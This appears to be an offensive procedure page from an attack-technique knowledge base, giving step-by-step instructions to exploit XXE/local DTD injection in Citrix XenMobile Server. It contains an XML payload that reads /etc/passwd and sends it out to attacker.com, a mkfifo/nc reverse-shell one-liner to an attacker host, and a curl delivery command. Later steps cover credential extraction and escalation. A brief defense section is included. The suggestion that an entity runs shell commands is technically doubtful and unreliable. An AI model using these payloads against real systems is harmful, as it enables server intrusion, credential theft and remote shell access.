---
id: 53a7ffa3-49bf-4885-a4aa-9ad3d6388f46
type: procedure
name: Local DTD Injection in Citrix XenMobile Server
verified: true
submitted: false
created_at: '2023-04-06T03:56:44.497123+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Collection|TA0009 - Collection]]'
techniques:
  - >-
    [[techniques/File-and-Directory-Discovery|T1083 - File and Directory
    Discovery]]
  - >-
    [[techniques/Command-and-Scripting-Interpreter|T1059 - Command and Scripting
    Interpreter]]
sub_techniques: []
tags:
  - '[[tags/Citrix XenMobile Server]]'
  - '[[tags/XML External Entity]]'
  - '[[tags/XXE with local DTD]]'
  - xxe
  - dtd-injection
  - file-read
  - rce
commands:
  - '[[commands/curl-send-xml-dtd-payload]]'
tools: []
platforms:
  - Web
  - Linux
skill_level: intermediate
impact_level: high
detection_risk: high
validated: true
---

# Local DTD Injection in Citrix XenMobile Server

## Summary

This procedure exploits a Local DTD Injection vulnerability in Citrix XenMobile Server by injecting a malicious Document Type Definition (DTD) into XML input. It enables attackers to read arbitrary files from the server (such as configuration files containing database credentials) and, in some cases, execute system commands, leading to potential full server compromise.

## Description

Citrix XenMobile Server processes XML inputs without properly disabling external entity resolution, allowing attackers with the ability to submit modified XML to define local DTD entities that reference server files or system commands. For file disclosure, an external entity points to a local file path (e.g., /etc/passwd or config files), and the parsed XML output includes the file contents. For command execution, the DTD can be crafted to invoke system processes via entities that expand during parsing. This technique targets vulnerable endpoints that accept XML payloads, such as authentication or configuration submission forms. Success depends on the parser's configuration and the attacker's access level, often requiring authenticated or low-privilege access to the server interface. The attack can lead to data exfiltration, credential theft, or remote code execution (RCE), compromising the entire mobile device management infrastructure.

## Requirements

1. Network access to the Citrix XenMobile Server (typically over HTTPS on port 443 or administrative ports like 4443).
2. Ability to submit XML input to a vulnerable endpoint (e.g., via authenticated session or direct API access).
3. Tools for crafting and sending HTTP requests (e.g., curl or a proxy like Burp Suite).
4. Knowledge of target file paths for disclosure (e.g., /opt/Citrix/XenMobile/etc/ for configs) or command paths for RCE.
5. The server must use a vulnerable XML parser (e.g., older versions of Xerces or similar without XXE protections).

## Defense

Defensive measures and detection strategies:

- Disable external entity processing in all XML parsers (e.g., set 'disallow-doctype-decl' to true in Java's DocumentBuilderFactory).
- Implement strict input validation and sanitization to reject XML with DOCTYPE declarations or external entities.
- Use least privilege access controls, running the XenMobile service under a non-root account with limited file system access.
- Enable web application firewall (WAF) rules to block XML payloads containing DTD references or suspicious entities.
- Monitor server logs for anomalous XML parsing errors, file access patterns, or unexpected command executions (e.g., via auditd on Linux).
- Regularly patch Citrix XenMobile to the latest version, as XXE vulnerabilities are often addressed in security updates.

## Objectives

1. Read sensitive files on the Citrix XenMobile Server, such as configuration files containing database credentials or API keys.
2. Execute arbitrary system commands on the server to achieve RCE, potentially leading to persistence or lateral movement.
3. Exfiltrate data or establish a foothold for further compromise of the mobile management infrastructure.

## Instructions

### Step 1: Prepare the Malicious XML Payload

**Context**: Craft an XML payload that includes a local DTD definition to reference either a file for disclosure or a system command for execution. Use the provided code snippet [[codes/Citrix-XenMobile-Local-DTD-Injection-Payload]] as the base, substituting the target file path or command as needed. This step ensures the payload is tailored to the objective (file read vs. RCE).

**Code Reference** ([[codes/Citrix-XenMobile-Local-DTD-Injection-Payload]]):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY %exfil SYSTEM 'http://attacker.com/?data=%file;'>">
  %eval;
  %exfil;
]>
<root>&exfil;</root>
```

> For file read, the entity expands to include file contents in the XML response. For RCE, modify the entity to something like "<!ENTITY % cmd SYSTEM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker_ip 4443 >/tmp/f'>" (adapted for local DTD). Expected: Valid XML structure without syntax errors; test locally with an XML parser if possible.

### Step 2: Identify the Vulnerable Endpoint

**Context**: Determine the XML-accepting endpoint in Citrix XenMobile, such as those for device enrollment, policy submission, or admin config uploads (e.g., /xenmobile/api/v1/endpoint). Use reconnaissance tools or documentation to confirm. This step verifies the attack surface without triggering the exploit.

**Instructions**: Review server documentation or use browser dev tools/proxy to inspect requests. Look for POST requests with Content-Type: application/xml.

> Expected: Endpoint URL like https://target.com/xenmobile/api/v1/config. No output yet; success if XML is accepted without immediate rejection.

### Step 3: Send the Payload to Trigger the Injection

**Context**: Submit the crafted XML payload to the vulnerable endpoint using an HTTP POST request. This parses the DTD on the server, triggering file read or command execution. Monitor the response for exfiltrated data.

**Command** ([[commands/curl-send-xml-dtd-payload]]):

```bash
curl -k -X POST -H "Content-Type: application/xml" -d @payload.xml https://$_TARGET_URL/$_ENDPOINT
```

> Replace $_TARGET_URL with the XenMobile server IP/hostname (e.g., target.com) and $_ENDPOINT with the vulnerable path (e.g., xenmobile/api/v1/config). Use -k to ignore SSL if self-signed. For authenticated endpoints, add -H "Authorization: Basic $_CREDENTIALS" or cookies. Expected: Server response includes entity expansion (e.g., file contents in XML body or via out-of-band channel like DNS/HTTP exfil). For RCE, check listener (e.g., nc -lvnp 4443) for shell callback.

### Step 4: Verify and Escalate

**Context**: Analyze the response for success indicators, such as disclosed file contents or command output. If file read succeeds, extract credentials for further access; if RCE, use the shell for persistence.

**Instructions**: Grep the response for sensitive data (e.g., grep "password" response.xml). If exfil is OOB, query your server logs.

> Expected: File contents like user lists or DB creds in response; or reverse shell connection. Success if data is retrieved or command executes without errors.
